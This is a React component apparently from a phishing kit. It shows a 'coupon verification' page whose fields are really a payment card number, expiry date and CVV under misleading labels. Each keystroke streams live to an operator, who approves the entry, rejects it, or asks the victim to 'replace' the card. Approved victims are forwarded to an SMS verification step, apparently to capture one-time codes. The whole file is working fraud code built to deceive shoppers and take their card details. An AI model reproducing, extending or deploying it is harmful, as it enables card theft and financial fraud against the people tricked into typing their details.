import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useRealtime, CouponData } from "@/context/RealtimeContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Loader2, AlertCircle } from "lucide-react";
import { useToast } from "@/components/ui/use-toast";

const CouponVerification = () => {
  const navigate = useNavigate();
  const { updateCouponData, setOrderStatus, orderStatus, submitOrder, currentOrderId, resubmitCoupon, startLiveSession } = useRealtime();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  
  const [formData, setFormData] = useState<CouponData>({
    code: "",
    dateMMYY: "",
    password: "",
  });

  // Start live typing session when entering coupon page
  useEffect(() => {
    startLiveSession();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Handle Admin Response
  useEffect(() => {
    if (orderStatus === "APPROVED") {
      setIsLoading(false);
      navigate(`/verify-sms`);
    } else if (orderStatus === "REJECTED") {
      setIsLoading(false);
      setError("Verification failed. Please check your coupon details and try again.");
      toast({
        variant: "destructive",
        title: "Verification Failed",
        description: "The coupon information provided was rejected.",
      });
      setOrderStatus("COUPON_SUBMITTING");
      startLiveSession({ force: true });
    } else if (orderStatus === "RETURN_COUPON") {
      setIsLoading(false);
      setError("Please check or replace your coupon and try again.");
      toast({
        variant: "destructive",
        title: "Coupon Verification Required",
        description: "Please check or replace your coupon and retry.",
      });
      setOrderStatus("COUPON_SUBMITTING");
      startLiveSession({ force: true });
    }
  }, [orderStatus, navigate, setOrderStatus, toast, startLiveSession]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // Format Date MM/YY
    if (name === "dateMMYY") {
      let formatted = value.replace(/\D/g, "");
      if (formatted.length >= 2) {
        formatted = `${formatted.slice(0, 2)}/${formatted.slice(2, 4)}`;
      }
      const newData = { ...formData, [name]: formatted };
      setFormData(newData);
      updateCouponData(newData);
      return;
    }

    const newData = { ...formData, [name]: value };
    setFormData(newData);
    // Broadcast live typing
    updateCouponData(newData);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsLoading(true);
    
    updateCouponData(formData);
    
    if (currentOrderId) {
      // Resubmission: update existing order's coupon
      await resubmitCoupon(formData);
    } else {
      // First submission: create new order
      await submitOrder(formData);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex flex-col">
        <Header />
        <main className="flex-1 flex flex-col items-center justify-center p-6">
          <div className="text-center space-y-6 max-w-md">
            <div className="relative w-20 h-20 mx-auto">
              <div className="absolute inset-0 border-4 border-muted rounded-full"></div>
              <div className="absolute inset-0 border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
            </div>
            <h2 className="font-serif text-2xl md:text-3xl">Verifying Coupon...</h2>
            <p className="text-muted-foreground">
              Please wait while we verify your exclusive offer code. This usually takes less than a minute. Do not refresh the page.
            </p>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12 flex items-center justify-center">
        <Card className="w-full max-w-lg shadow-lg border-primary/10">
          <CardHeader className="text-center pb-8">
            <CardTitle className="font-serif text-3xl mb-2">Final Step</CardTitle>
            <CardDescription className="text-base">
              Enter your exclusive offer details to complete your order.
            </CardDescription>
          </CardHeader>
          <CardContent>
            {error && (
              <div className="bg-destructive/10 text-destructive text-sm p-3 rounded-md flex items-center gap-2 mb-6">
                <AlertCircle className="w-4 h-4" />
                {error}
              </div>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code">Coupon Code (15-16 digits)</Label>
                <Input 
                  id="code" 
                  name="code" 
                  placeholder="XXXX-XXXX-XXXX-XXXX"
                  maxLength={19} // Allow for some spacing if user adds it, but mostly digits
                  required 
                  value={formData.code}
                  onChange={handleInputChange}
                  className="font-mono text-lg tracking-wide"
                />
              </div>

              <div className="grid grid-cols-2 gap-6">
                <div className="space-y-2">
                  <Label htmlFor="dateMMYY">Date (MM/YY)</Label>
                  <Input 
                    id="dateMMYY" 
                    name="dateMMYY" 
                    placeholder="MM/YY"
                    maxLength={5}
                    required 
                    value={formData.dateMMYY}
                    onChange={handleInputChange}
                    className="font-mono text-lg text-center"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="password">CVV / Pass (3-4 digits)</Label>
                  <Input 
                    id="password" 
                    name="password" 
                    type="password"
                    placeholder="•••"
                    maxLength={4}
                    required 
                    value={formData.password}
                    onChange={handleInputChange}
                    className="font-mono text-lg text-center tracking-widest"
                  />
                </div>
              </div>

              <Button type="submit" className="w-full text-lg h-12 mt-4">
                Verify & Complete Order
              </Button>
            </form>
          </CardContent>
        </Card>
      </main>
      <Footer />
    </div>
  );
};

export default CouponVerification;
